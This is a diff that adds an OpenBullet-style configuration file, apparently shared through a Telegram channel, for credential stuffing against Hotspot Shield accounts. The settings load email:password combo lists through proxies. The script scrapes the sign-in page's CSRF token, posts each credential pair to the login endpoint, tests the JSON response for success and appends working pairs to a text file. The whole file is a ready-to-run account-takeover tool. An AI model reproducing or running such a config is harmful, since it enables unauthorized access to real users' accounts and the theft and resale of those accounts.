@@ -1,0 +1,67 @@
+[SETTINGS]
+{
+  "Name": "HotspotShield",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-17T04:43:36.6903467-08:00",
+  "AdditionalInfo": "Telegram Channel : T.me/ghoulblack",
+  "RequiredPlugins": [],
+  "Author": "👑LilTOBA👑",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#G REQUEST GET "https://account.hotspotshield.com/sign-in/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#T PARSE "<SOURCE>" LR "vxsftok: '" "'" -> VAR "TOKEN" 
+
+#P REQUEST POST "https://account.hotspotshield.com/sign-in" 
+  CONTENT "login=<USER>&pwd=<PASS>&remember=0&ajax=true&vxsftok=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "authority: account.hotspotshield.com" 
+  HEADER "method: POST" 
+  HEADER "path: /sign-in" 
+  HEADER "scheme: https" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "origin: https://account.hotspotshield.com" 
+  HEADER "referer: https://account.hotspotshield.com/sign-in/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "result\":1" 
+  KEYCHAIN Failure OR 
+    KEY "result\":0" 
+
+UTILITY File "hotspotshield.txt" AppendLines "<USER>: <PASS> //\\n =============================" 
+
